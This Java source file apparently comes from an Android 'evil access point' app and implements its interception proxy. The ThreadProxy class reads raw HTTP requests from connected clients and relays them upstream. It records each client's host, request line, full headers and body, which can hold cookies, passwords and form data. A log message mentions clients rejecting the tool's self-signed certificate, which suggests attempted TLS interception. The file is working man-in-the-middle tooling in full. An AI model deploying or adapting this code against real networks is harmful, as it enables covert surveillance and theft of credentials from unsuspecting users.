package com.nibiru.evil_ap.proxy;

import android.util.Log;

import com.nibiru.evil_ap.SharedClass;
import com.nibiru.evil_ap.log.Client;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.Socket;
import java.net.SocketTimeoutException;

import javax.net.ssl.SSLProtocolException;

import okhttp3.MediaType;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;

/**
 * Created by Nibiru on 2016-11-25.
 */

class ThreadProxy implements Runnable{
    /**************************************CLASS FIELDS********************************************/
    private final String TAG = getClass().getSimpleName();
    private Socket sClient;
    private Client c;
    private SharedClass mSharedObj;
    private boolean debug = false;
    /**************************************CLASS METHODS*******************************************/
    ThreadProxy(Socket sClient, SharedClass sharedObj) {
        this.sClient = sClient;
        mSharedObj = sharedObj;
        c = mSharedObj.getClientByIp(sClient.getInetAddress().toString().substring(1));
    }
    @Override
    public void run() {
        //things we will eventually close
        BufferedReader inFromClient = null;
        OutputStream outToClient = null;
        Response res = null;
        try {
            inFromClient = new BufferedReader(new InputStreamReader(sClient.getInputStream()));
            outToClient = sClient.getOutputStream();

            //get client request string
            Request req = getRequest(inFromClient, c);
            if (req == null) return;

            //make request and get okhttp response
            res = mSharedObj.getHttpClient().newCall(req).execute();

            //get and send response headers
            String headers = getResponseHeaders(res);
            //in order to comply with protocol
            headers = headers.replaceAll("\\n", "\r\n");
            sendBytes(headers.getBytes(), outToClient);
            //get and send response bytes
            byte[] bytesBody = res.body().bytes();
            sendBytes(bytesBody, outToClient);
            if (debug) Log.d(TAG + "[OUT]", headers);
            outToClient.flush();

        } catch (IOException e) {
            if (e instanceof SocketTimeoutException)
                Log.e(TAG, "TIMEOUT!");
            if (e instanceof SSLProtocolException) {
                Log.e(TAG, "Client doesn't like our self-signed cert");
            }
            e.printStackTrace();
        } finally {
            //clean up
            if (res != null) res.body().close();
            try {
                if (outToClient != null) outToClient.close();
                if (inFromClient != null) inFromClient.close();
                if (sClient != null) sClient.close();
            }
            catch (IOException e) {
                e.printStackTrace();
            }
        }
    }

    private void sendBytes(byte[] msg, OutputStream out) throws IOException{
        out.write(msg, 0, msg.length);
        if (debug) Log.d(TAG + "[OUT]", "sent chunk!");
    }

    private String getResponseHeaders(Response res){
        String resToClient = "";
        if (debug) Log.d(TAG, "<==================Sending response==================>");
        //find status line
        // /n ! not /r/n !
        switch (res.code()) {
            //TODO: sometimes get 303, 307 (redirections) and 400(bad request)
            case 200: resToClient += "HTTP/1.1 200 OK\n"; break;
            case 204: resToClient += "HTTP/1.1 204 No Content\n"; break;
            case 301: resToClient += "HTTP/1.1 301 Moved Permanently\n"; break;
            case 302: resToClient += "HTTP/1.1 302 Found\n"; break;
            case 304: resToClient += "HTTP/1.1 304 Not Modified\n"; break;
            case 403: resToClient += "HTTP/1.1 403 Forbidden\n"; break;
            case 404: resToClient += "HTTP/1.1 404 Not Found\n"; break;
            default: Log.e(TAG, "UNKNOWN STATUS CODE = " + res.code());
        }
        //send headers
        resToClient += res.headers().toString() + "\n";
        return resToClient;
    }

    private Request getRequest(BufferedReader in, Client c) throws IOException {
        Request.Builder builder = new Request.Builder();
        String requestLine = in.readLine();
        String host = "";
        StringBuilder headers = new StringBuilder();
        String body = "";
        //we only support GET and POST requests
        if (requestLine == null || !(requestLine.startsWith("GET")||
                requestLine.startsWith("POST"))) {
            Log.e(TAG, "UNSUPPORTED HTTP METHOD! (or readLine returned null)\n" + requestLine);
            return null;
        }
        String[] requestLineValues = requestLine.split("\\s+");

        String line;
        int length = 0;
        String contentType= "";
        //read string request until there are no lines to read
        while ((line = in.readLine()) != null) {
            //last line of request message header is a blank line (\r\n\r\n)
            if (line.isEmpty()) break;
            //we read a header line
            headers.append(line).append("\r\n");
            String[] split = line.split(": ");
            if (line.startsWith("Content-Length: ")){
                length = Integer.parseInt(split[1]);
            }
            if (line.startsWith("Content-Type: ")){
                contentType = split[1];
            }
            if (line.startsWith("Host: ")){
                host = split[1];
                String url = "http://" + host + requestLineValues[1];
                Log.d(TAG, url);
                builder.url(url);
            }
            else {
                builder.addHeader(split[0], split[1]);
            }
        }

        // if there is Message body, read it
        if (length > 0) {
            int read;
            while ((read = in.read()) != -1) {
                body += ((char) read);
                if (body.length() == length) break;
            }
            //add body to okhttp request
            builder.post(RequestBody.create(MediaType.parse(contentType), body));
        }
        //LOG REQUEST BEING MADE
        mSharedObj.addRequest(c, host, requestLine, headers.toString() + "\n" + body);
        return builder.build();
    }
}
